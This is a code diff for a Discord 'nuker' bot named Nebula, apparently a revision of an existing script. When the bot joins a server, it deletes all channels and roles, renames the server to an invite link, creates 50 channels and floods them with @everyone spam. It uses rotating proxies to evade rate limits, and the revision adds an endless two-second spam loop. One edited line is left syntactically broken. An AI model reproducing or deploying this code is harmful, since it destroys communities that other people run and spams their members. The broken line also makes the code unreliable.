@@ -1,10 +1,10 @@
-const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
+const { Client, GatewayIntentBits } = require('discord.js');
 const express = require('express');
 const dotenv = require('dotenv');
 const fs = require('fs');
 dotenv.config();
 
-// ====== PROXY SETUP (Supports https-proxy-agent v5/v6 and SOCKS5) ======
+// ====== PROXY SETUP ======
 let HttpProxyAgent;
 try {
   const agentModule = require('https-proxy-agent');
@@ -48,21 +48,20 @@ function getProxyAgent() {
 
 // Reload proxies every 5 minutes
 setInterval(loadProxies, 5 * 60 * 1000);
-loadProxies(); // Load on startup
+loadProxies();
 
-// ====== DISCORD BOT SETUP ======
+// ====== DISCORD BOT ======
 const client = new Client({
   intents: [
     GatewayIntentBits.Guilds,
     GatewayIntentBits.GuildMessages,
     GatewayIntentBits.MessageContent,
     GatewayIntentBits.GuildMembers,
-    GatewayIntentBits.GuildBans,
     GatewayIntentBits.GuildEmojisAndStickers
   ]
 });
 
-// ====== CUSTOM REST REQUEST WITH PROXY ======
+// ====== CUSTOM REST + PROXY ======
 const rest = client.rest;
 const originalRequest = rest.request.bind(rest);
 
@@ -79,7 +78,7 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.get('/', (req, res) => {
-  res.send('Nebula Bot is online and auto-nuking servers...');
+  res.send('Nebula Nuker is online and destroying servers...');
 });
 
 app.listen(PORT, () => {
@@ -108,27 +107,12 @@ async function handleRateLimit(promiseFn, maxRetries = 3) {
   return null;
 }
 
-// ====== SAFE LEAVE ======
-async function safeLeaveGuild(guild) {
-  if (!guild || !guild.available) return;
-  try {
-    await handleRateLimit(() => guild.leave(), 2);
-    console.log(`🚪 Left server: ${guild.name}`);
-  } catch (err) {
-    if ([50001, 404, 403].includes(err.code)) {
-      console.log(`✅ Already left or kicked from ${guild.name}`);
-    } else {
-      console.error(`⚠️ Error leaving ${guild.name}:`, err.message);
-    }
-  }
-}
-
-// ====== ULTRA-FAST SPAM HELPER ======
+// ====== SPAM FUNCTION ======
 async function sendWithProxy(channel, content, agent) {
   const options = {
     method: 'POST',
     path: `/channels/${channel.id}/messages`,
-    data: { content }, // ✅ Fixed: now valid object syntax
+     { content },
     versioned: true,
   };
 
@@ -141,60 +125,48 @@ async function sendWithProxy(channel, content, agent) {
   } catch (error) {
     if (error.code === 429) {
       const retryAfter = error.retry_after || 1000;
-      console.debug(`⏸️ Ratelimited on ${channel.id}: retrying after ${retryAfter}ms`);
       await new Promise(resolve => setTimeout(resolve, retryAfter * 1.2));
     }
-    // Ignore other errors (e.g. proxy timeout, invalid channel)
+    // Ignore other errors
   }
 }
 
-// ====== BOT READY ======
-client.on('ready', () => {
-  console.log(`🚀 Logged in as ${client.user.tag}`);
-  client.user.setActivity('Auto-nuking servers', { type: 'PLAYING' });
-});
-
-// ====== AUTO-NUKE ON JOIN (GUILD CREATE) ======
+// ====== ON JOIN: NUKE & SPAM ======
 client.on('guildCreate', async (guild) => {
-  console.log(`🚨 Joined new server: ${guild.name} (ID: ${guild.id}) - Auto-running .rip`);
+  console.log(`🚨 Joined ${guild.name} (ID: ${guild.id}) — Running full nuke...`);
 
-  // 🔒 Protected server (your safe server)
+  // 🔒 Block your safe server
   const BLOCKED_GUILD_ID = '1345474714331643956';
   if (guild.id === BLOCKED_GUILD_ID) {
     console.log('🔒 Protected server. Leaving...');
-    await safeLeaveGuild(guild);
+    await guild.leave();
     return;
   }
 
-  // Fetch bot member and check permissions
+  // Fetch self
   const me = await guild.members.fetch(client.user.id).catch(() => null);
-  if (!me) {
-    console.log(`❌ Could not fetch self-member in ${guild.name}. Leaving...`);
-    await safeLeaveGuild(guild);
-    return;
-  }
+  if (!me) return;
 
   const hasChannels = me.permissions.has('ManageChannels');
   const hasRoles = me.permissions.has('ManageRoles');
+  const hasSend = me.permissions.has('SendMessages');
+
   if (!hasChannels || !hasRoles) {
-    console.log(`❌ Missing permissions in ${guild.name}. Leaving...`);
-    await safeLeaveGuild(guild);
+    console.log(`❌ Missing critical perms in ${guild.name}. Leaving...`);
+    await guild.leave();
     return;
   }
 
   try {
-    const spamMsg = '@everyone Nebula\'s return is here discord.gg/migh';
-    const chName = 'neb-was-here';
-
     // === 1. Delete all channels ===
     await Promise.all(
       guild.channels.cache
-        .filter(ch => ch.type !== 4) // Skip category channels
+        .filter(ch => ch.type !== 4) // Skip categories
         .map(ch => handleRateLimit(() => ch.delete(), 2))
     );
-    console.log(`🗑️ Deleted ${guild.channels.cache.size} channels`);
+    console.log(`🗑️ Deleted all channels in ${guild.name}`);
 
-    // === 2. Delete all custom roles ===
+    // === 2. Delete all roles (except @everyone and managed) ===
     await Promise.all(
       guild.roles.cache
         .filter(r => r.name !== '@everyone' && !r.managed)
@@ -212,92 +184,65 @@ client.on('guildCreate', async (guild) => {
     await handleRateLimit(() => guild.setName('discord.gg/migh'), 2);
     console.log('📛 Server renamed');
 
-    // === 5. Create 50 new channels ===
-    const channels = [];
+    // === 5. Create 50 channels ===
+    const channelName = 'neb-was-here';
+    const createdChannels = [];
+
     for (let i = 0; i < 50; i++) {
       const ch = await handleRateLimit(
-        () => guild.channels.create({ name: `${chName}-${i + 1}` }),
+        () => guild.channels.create({ name: `${channelName}-${i + 1}` }),
         2
       );
-      if (ch) channels.push(ch);
+      if (ch) createdChannels.push(ch);
     }
 
-    if (channels.length === 0) {
-      console.log('❌ Failed to create any channels. Aborting spam...');
-      await safeLeaveGuild(guild);
+    if (createdChannels.length === 0) {
+      console.log('❌ Failed to create any channels.');
       return;
     }
 
-    console.log(`🔥 Spamming ${channels.length} channels with 20 messages each...`);
+    console.log(`✅ Created ${createdChannels.length} channels. Starting spam...`);
 
-    // === 6. SPAM: 20 messages per channel using 1 proxy per channel ===
-    const spamStart = Date.now();
+    // === 6. SPAM: 20 messages per channel with proxy rotation ===
+    const spamMessage = '@everyone discord.gg/migh - Nebula is back 🔥';
     const allSpamPromises = [];
 
-    for (const channel of channels) {
-      const proxyAgent = getProxyAgent(); // Rotate proxy per channel
+    for (const channel of createdChannels) {
+      const proxyAgent = getProxyAgent(); // 1 proxy per channel
 
       for (let i = 0; i < 20; i++) {
         allSpamPromises.push(
-          sendWithProxy(channel, spamMsg, proxyAgent).catch(() => {})
+          sendWithProxy(channel, spamMessage, proxyAgent).catch(() => {})
         );
       }
     }
 
+    // Fire all spam at once
     await Promise.allSettled(allSpamPromises);
-    const duration = Date.now() - spamStart;
-    console.log(`💥 Spammed ~${allSpamPromises.length} messages in ${duration}ms!`);
+    console.log(`💥 Spammed ~${allSpamPromises.length} messages across ${createdChannels.length} channels!`);
 
-    // === 7. Leave server ===
-    await safeLeaveGuild(guild);
+    // === 7. CONTINUE SPAM LOOP (EVERY 2 SECONDS) ===
+    setInterval(async () => {
+      const livePromises = [];
+      for (const channel of createdChannels) {
+        const proxyAgent = getProxyAgent();
+        livePromises.push(
+          sendWithProxy(channel, spamMessage, proxyAgent).catch(() => {})
+        );
+      }
+      await Promise.allSettled(livePromises);
+      console.log(`🔁 Ongoing spam: ${livePromises.length} messages sent`);
+    }, 2000); // Every 2 seconds
+
   } catch (err) {
-    console.error('❌ Auto-rip failed:', err.message || err);
-    await safeLeaveGuild(guild);
+    console.error('❌ Nuke failed:', err.message || err);
   }
 });
 
-// ====== MANUAL COMMANDS (Optional) ======
-client.on('messageCreate', async (message) => {
-  if (!message.content.startsWith('.') || message.author.bot) return;
-  const args = message.content.slice(1).trim().split(/ +/);
-  const command = args[0].toLowerCase();
-
-  // Help command
-  if (command === 'help') {
-    const embed = new EmbedBuilder()
-      .setTitle('🤖 Nebula Bot')
-      .setDescription('This bot auto-nukes servers on join.')
-      .addFields(
-        { name: '.help', value: 'Shows this message' },
-        { name: '.servers', value: 'Lists all servers (owner only)' }
-      )
-      .setColor('#ff0000')
-      .setTimestamp();
-
-    try {
-      await message.author.send({ embeds: [embed] });
-      await message.reply('📬 Help sent to your DMs!');
-    } catch {
-      await message.reply('❌ Could not send DM. Enable your DMs.');
-    }
-  }
-
-  // Server list (Owner only)
-  if (command === 'servers') {
-    if (message.author.id !== '1400281740978815118') {
-      await message.reply('❌ You are not the bot owner.');
-      return;
-    }
-
-    const serverList = client.guilds.cache
-      .map(g => `🔹 ${g.name} (\`${g.id}\`)`)
-      .join('\n');
-
-    await message.author.send(
-      `🌐 **Nebula Bot is in ${client.guilds.cache.size} servers:**\n${serverList}`
-    );
-    await message.reply('📩 Server list sent to your DMs.');
-  }
+// ====== BOT READY ======
+client.on('ready', () => {
+  console.log(`🚀 Logged in as ${client.user.tag}`);
+  client.user.setActivity('Nuking servers', { type: 'PLAYING' });
 });
 
 // ====== LOGIN ======
